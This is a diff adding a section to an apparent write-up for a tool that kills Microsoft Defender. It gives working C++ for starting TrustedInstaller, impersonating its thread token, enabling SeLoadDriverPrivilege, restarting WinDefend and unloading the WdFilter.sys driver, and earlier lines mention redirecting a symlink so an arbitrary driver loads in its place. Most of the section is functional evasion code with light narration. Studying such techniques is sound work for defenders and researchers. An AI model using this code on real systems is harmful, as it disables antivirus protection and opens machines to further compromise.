@@ -146,3 +146,152 @@ Note two things:
 2. right before returning STATUS_SUCCESS we call CloseHandle on the newly created symlink. This is necessary because if the handle stays open the reference counter of the symlink will be 2 (1 for the handle, plus 1 for the OBJ\_PERMANENT) and we won't be able to delete it later when we will try to restore the old symlink.  
 
 At this point the symlink is changed and points to a location we have control on. In this location we will have constructed a directory tree which mimicks WdFilter's one and copied our arbitrary driver, conveniently renamed WdFilter.sys - we do it in the first line of the main function through a series of system() function calls. I know it's uncivilized to do it this way, deal with it.
+### Killing Defender
+Now we move to the juicy part, killing Damnfender! This is done in the ImpersonateAndUnload function (implemented in ImpersonateAndUnload.cpp) in 4 steps:
+ 1. start the TrustedInstaller service & process;
+ 2. open TrustedInstaller's first thread;
+ 3. impersonate its token;
+ 4. unload Wdfilter;
+We need to impersonate TrustedInstaller because the Defender and WdFilter services have ACLs which gives full control on them only to NT SERVICE\TrustedInstaller and not to SYSTEM or Administrators.
+
+#### Step 1 - Starting TrustedInstaller
+The first thing to do is starting the TrustedInstaller service. To do so we need to get a handle (actually a SC\_HANDLE, which a particular type of HANDLE for the Service Control Manager.) on the Service Control Manager using the OpenSCManagerW API, then use that handle to call OpenServiceW on the TrustedInstaller service and get a handle on it, and finally use that handle to call StartServiceW.  This will start the TrustedInstaller service, which in turn will start the TrustedInstaller process, whose token contains the SID of NT SERVICE\TrustedInstaller. Pretty straightforward, here's the code:
+```C++
+RAII::ScHandle svcManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+if (!svcManager.GetHandle())
+{
+	Error(GetLastError());
+	return 1;
+}
+else std::cout << "[+] Opened handle to the SCM!\n";
+
+RAII::ScHandle trustedInstSvc = OpenServiceW(svcManager.GetHandle(), L"TrustedInstaller", SERVICE_START);
+if (!trustedInstSvc.GetHandle())
+{
+	Error(GetLastError());
+	std::cout << "[-] Couldn't get a handle to the TrustedInstaller service...\n";
+	return 1;
+}
+else std::cout << "[+] Opened handle to the TrustedInstaller service!\n";
+
+auto success = StartServiceW(trustedInstSvc.GetHandle(), 0, nullptr);
+if (!success && GetLastError() != 0x420) // 0x420 is the error code returned when the service is already running
+{
+	Error(GetLastError());
+	std::cout << "[-] Couldn't start TrustedInstaller service...\n";
+	return 1;
+}
+else std::cout << "[+] Successfully started the TrustedInstaller service!\n";
+```
+#### Step 2 - Open TrustedInstaller's first thread
+Now that the TrustedInstaller process is alive, we need to open a handle its first thread, so that we can call NtImpersonateThread on it in step 3. This is done using the following code:
+```C++
+auto trustedInstPid = FindPID(L"TrustedInstaller.exe");
+if (trustedInstPid == ERROR_FILE_NOT_FOUND)
+{
+	std::cout << "[-] Couldn't find the TrustedInstaller process...\n";
+	return 1;
+}
+
+auto trustedInstThreadId = GetFirstThreadID(trustedInstPid);
+if (trustedInstThreadId == ERROR_FILE_NOT_FOUND || trustedInstThreadId == 0)
+{
+	std::cout << "[-] Couldn't find TrustedInstaller process' first thread...\n";
+	return 1;
+}
+
+RAII::Handle hTrustedInstThread = OpenThread(THREAD_DIRECT_IMPERSONATION, false, trustedInstThreadId);
+if (!hTrustedInstThread.GetHandle())
+{
+	std::cout << "[-] Couldn't open a handle to the TrustedInstaller process' first thread...\n";
+	return 1;
+}
+else std::cout << "[+] Opened a THREAD_DIRECT_IMPERSONATION handle to the TrustedInstaller process' first thread!\n";
+```
+FindPID and GetFirstThreadID are two helper functions I implement in FindPID.cpp and GetFirstThreadID.cpp which do exactly what their names tell you: they find the PID of the process you pass them and give you the TID of its first thread, easy. We need the first thread as it will have for sure the NT SERVICE\TrustedInstaller SID in it. Once we've got the thread ID we pass it to the OpenThread API with the THREAD\_DIRECT\_IMPERSONATION access right, which enables us to use the returned handle with NtImpersonateThread later.
+#### Step 3 - Impersonate TrustedInstaller
+Now that we have a powerful enough handle we can call NtImpersonateThread on it. But first we have to initialize a SECURITY\_QUALITY\_OF\_SERVICE data structure to tell the kernel which kind of impersonation we want to perform, in this case SecurityImpersonation, that's a impersonation level which allows us to impersonate the security context of our target locally ([look here for more information on Impersonation Levels](https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels)):
+```C++
+SECURITY_QUALITY_OF_SERVICE sqos = {};
+sqos.Length = sizeof(sqos);
+sqos.ImpersonationLevel = SecurityImpersonation;
+auto status = NtImpersonateThread(GetCurrentThread(), hTrustedInstThread.GetHandle(), &sqos);
+if (status == STATUS_SUCCESS) std::cout << "[+] Successfully impersonated TrustedInstaller token!\n";
+else
+{
+	Error(GetLastError());
+	std::cout << "[-] Failed to impersonate TrustedInstaller...\n";
+	return 1;
+}
+```
+
+If NtImpersonateThread did its job well our thread should have the SID of TrustedInstaller now. Note: in order not to fuck up the main thread's token, ImpersonateAndUnload is called by main a sacrificial std::thread. Now that we have the required access rights, we can go to step 4 and actually unload the driver.
+#### Step 4 - Unloading WdFilter.sys
+To unload WdFilter we first have to release the lock imposed on it by Defender itself. This is achieved by restarting the WinDefend service using the same approach we used to start TrustedInstaller's one. But first we need to give our token the ability to load and unload drivers. This is done by enabling the SeLoadDriverPrivilege in our security context by calling the helper function SetPrivilege, defined in SetPrivilege.cpp, and by passing to it our thread's token and the privilege we want to enable:
+```C++
+HANDLE tempHandle;
+success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
+if (!success)
+{
+	Error(GetLastError());
+	std::cout << "[-] Failed to open current thread token, exiting...\n";
+	return 1;
+}
+RAII::Handle currentToken = tempHandle;
+
+success = SetPrivilege(currentToken.GetHandle(), L"SeLoadDriverPrivilege", true);
+if (!success) return 1;
+```
+
+Once we have the SeLoadDriverPrivilege enabled we proceed to restart the Defender's service, WinDefend:
+```C++
+RAII::ScHandle winDefendSvc = OpenServiceW(svcManager.GetHandle(), L"WinDefend", SERVICE_ALL_ACCESS);
+if (!winDefendSvc.GetHandle())
+{
+	Error(GetLastError());
+	std::cout << "[-] Couldn't get a handle to the WinDefend service...\n";
+	return 1;
+}
+else std::cout << "[+] Opened handle to the WinDefend service!\n";
+
+SERVICE_STATUS svcStatus;
+success = ControlService(winDefendSvc.GetHandle(), SERVICE_CONTROL_STOP, &svcStatus);
+if (!success)
+{
+	Error(GetLastError());
+	std::cout << "[-] Couldn't stop WinDefend service...\n";
+	return 1;
+}
+else std::cout << "[+] Successfully stopped the WinDefend service! Proceeding to restart it...\n";
+
+Sleep(10000);
+
+success = StartServiceW(winDefendSvc.GetHandle(), 0, nullptr);
+if (!success)
+{
+	Error(GetLastError());
+	std::cout << "[-] Couldn't restart WinDefend service...\n";
+	return 1;
+}
+else std::cout << "[+] Successfully restarted the WinDefend service!\n";
+```
+
+The only thing different from when we started TrustedInstaller is that we first have to stop the service using the ControlService API (by passing the SERVICE\_CONTROL\_STOP control code) and then start it back using StartServiceW once again. Once Defender's restarted, the lock on WdFilter is released and we can call NtUnloadDriver on it:
+
+```C++
+UNICODE_STRING wdfilterDrivServ;
+RtlInitUnicodeString(&wdfilterDrivServ, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Wdfilter");
+
+status = NtUnloadDriver(&wdfilterDrivServ);
+if (status == STATUS_SUCCESS) 
+{
+	std::cout << "[+] Successfully unloaded Wdfilter!\n";
+}
+else
+{
+	Error(status);
+	std::cout << "[-] Failed to unload Wdfilter...\n";
+}
+return status;
+```
+NtUnloadDriver gets a single argument, which is a UNICODE\_STRING containing the driver's registry path (which is a NT path, as \Registry can be seen using WinObj). If everything went according to plan, WdFilter has been unloaded from the kernel.
